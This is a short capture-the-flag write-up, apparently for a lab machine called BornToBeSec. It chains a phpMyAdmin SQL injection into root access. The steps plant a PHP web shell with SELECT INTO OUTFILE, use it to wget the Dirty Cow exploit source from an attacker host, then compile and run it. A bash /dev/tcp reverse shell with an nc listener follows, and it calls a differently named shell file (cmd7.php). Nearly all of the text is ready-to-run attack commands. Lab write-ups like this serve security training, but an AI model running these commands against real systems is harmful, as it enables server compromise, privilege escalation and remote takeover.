# Dirty Cow in the SQL Injection

In other write-ups, we have seen how to exploit the Dirty Cow vulnerability to gain root access.
But we needed to have the password of the user `laurie` of the machein to exploit it.

In this write-up, we will see how compile and run the Dirty Cow exploit without having a ssh connection on the machine, via a SQL Injection in the phpMyAdmin panel.

Like as previous, this is the php code for executing command via the forum page:

```sql
select '<?php system($_GET["cmd"]); ?>' into outfile "/var/www/forum/templates_c/cmd.php"
```

Now, we can execute any command, first of all we need to send the dirty.c file to the server and compile it:

```bash

curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=wget http://attacker:8000/dirty.c 2> /dev/stdout" # Send the dirty.c file from the attacker machine to the server
curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=ls" # Check if the file is there
curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=gcc -pthread dirty.c -o dirty -lcrypt" # Compile the dirty.c file
curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=./dirty 4242" # Execute the compiled file with the password 4242
```
 We could even change the user firefart to ft_root or laurie for getting a ssh connection via this command but right now we stay the simple way.
```bash
sed -i 's/firefart/ft_root/g' dirty.c
```

After that, we can check the id in su:
```bash
curl --insecure --get https://BornToBeSec/forum/templates_c/cmd.php --data-urlencode "cmd=su firefart -c id"

```

We could also create a reverse shell with the following command:
```bash
nc -lvp 4444 # On the attacker machine
curl --insecure --get https://BornToBeSec/forum/templates_c/cmd7.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.1/4444 0>&1'" # On the target machine
```
